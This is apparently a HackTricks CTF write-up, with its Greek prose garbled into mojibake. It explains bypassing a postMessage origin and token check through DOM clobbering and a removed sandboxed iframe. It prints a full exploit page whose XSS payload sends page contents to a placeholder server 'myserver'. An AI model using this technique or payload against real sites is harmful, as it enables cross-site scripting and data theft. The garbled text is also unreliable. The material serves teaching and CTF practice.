# Bypassing SOP with Iframes - 2

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Iframes in SOP-2

In the [**Î»ÏÏƒÎ·**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) for this [**Ï€ÏÏŒÎºÎ»Î·ÏƒÎ·**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)**,** [**@Strellic\_**](https://twitter.com/Strellic\_) proposes a similar method to the previous section. Let's check it.

In this challenge the attacker needs to **bypass** this:
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
Î‘Î½ Ï„Î¿ ÎºÎ¬Î½ÎµÎ¹, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î­Î½Î± **postmessage** Î¼Îµ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ HTML Ï€Î¿Ï… Î¸Î± Î³ÏÎ±Ï†Ï„ÎµÎ¯ ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î± Î¼Îµ **`innerHTML`** Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Î¸Î±ÏÎ¹ÏƒÎ¼ÏŒ (**XSS**).

ÎŸ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Ï„Î¿Î½ **Ï€ÏÏÏ„Î¿ Î­Î»ÎµÎ³Ï‡Î¿** ÎµÎ¯Î½Î±Î¹ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿ **`window.calc.contentWindow`** **`undefined`** ÎºÎ±Î¹ Ï„Î¿ **`e.source`** **`null`**:

* **`window.calc.contentWindow`** ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± **`document.getElementById("calc")`**. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ­ÏˆÎµÏ„Îµ Ï„Î¿ **`document.getElementById`** Î¼Îµ **`<img name=getElementById />`** (ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ Sanitizer API -[ÎµÎ´Ï](https://wicg.github.io/sanitizer-api/#dom-clobbering)- Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÎ¹ Î±Ï€ÏŒ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ DOM clobbering ÏƒÏ„Î·Î½ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï„Î¿Ï… ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·).
* Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ­ÏˆÎµÏ„Îµ Ï„Î¿ **`document.getElementById("calc")`** Î¼Îµ **`<img name=getElementById /><div id=calc></div>`**. Î¤ÏŒÏ„Îµ, Ï„Î¿ **`window.calc`** Î¸Î± ÎµÎ¯Î½Î±Î¹ **`undefined`**.
* Î¤ÏÏÎ±, Ï‡ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Îµ Ï„Î¿ **`e.source`** Î½Î± ÎµÎ¯Î½Î±Î¹ **`undefined`** Î® **`null`** (ÎµÏ€ÎµÎ¹Î´Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ `==` Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¿ `===`, **`null == undefined`** ÎµÎ¯Î½Î±Î¹ **`True`**). Î¤Î¿ Î½Î± Ï„Î¿ Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ ÎµÎ¯Î½Î±Î¹ "ÎµÏÎºÎ¿Î»Î¿". Î‘Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± **iframe** ÎºÎ±Î¹ **ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ** Î­Î½Î± **postMessage** Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ ÎºÎ±Î¹ Î±Î¼Î­ÏƒÏ‰Ï‚ **Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÏ„Îµ** Ï„Î¿ iframe, Ï„Î¿ **`e.origin`** Î¸Î± ÎµÎ¯Î½Î±Î¹ **`null`**. Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î¿Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÏÎ´Î¹ÎºÎ±
```javascript
let iframe = document.createElement('iframe');
document.body.appendChild(iframe);
window.target = window.open("http://localhost:8080/");
await new Promise(r => setTimeout(r, 2000)); // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`);
document.body.removeChild(iframe); //e.origin === null
```
Î“Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Î¿ **Î´ÎµÏÏ„ÎµÏÎ¿Ï‚ Î­Î»ÎµÎ³Ï‡Î¿Ï‚** ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ token, ÏƒÏ„Î­Î»Î½Î¿Ï…Î¼Îµ **`token`** Î¼Îµ Ï„Î¹Î¼Î® `null` ÎºÎ±Î¹ ÎºÎ¬Î½Î¿Ï…Î¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® **`window.token`** **`undefined`**:

* Î— Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Ï„Î¿Ï… `token` ÏƒÏ„Î¿ postMessage Î¼Îµ Ï„Î¹Î¼Î® `null` ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»Î®.
* **`window.token`** ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ **`getCookie`** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ **`document.cookie`**. Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ **`document.cookie`** ÏƒÎµ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ **`null`** Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ·Ï‚ Ï€ÏÎ¿ÎºÎ±Î»ÎµÎ¯ Î­Î½Î± **error**. Î‘Ï…Ï„ÏŒ Î¸Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î·Î½ **`window.token`** Î½Î± Î­Ï‡ÎµÎ¹ Ï„Î¹Î¼Î® **`undefined`**.

Î— Ï„ÎµÎ»Î¹ÎºÎ® Î»ÏÏƒÎ· Î±Ï€ÏŒ [**@terjanq**](https://twitter.com/terjanq) ÎµÎ¯Î½Î±Î¹ Î· [**Î±ÎºÏŒÎ»Î¿Ï…Î¸Î·**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html):
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open('https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"');

function start(){
var ifr = document.createElement('iframe');
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = 'allow-scripts allow-popups';
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr);

function hack(){
var win = open('https://obligatory-calc.ctf.sekai.team');
setTimeout(()=>{
parent.postMessage('remove', '*');
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage({token:null, result:"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>"}, '*');
},1000);
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = e=> {if(e.data == 'remove') document.body.innerHTML = ''; }
}
setTimeout(start, 1000);
</script>
</body>
</html>
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
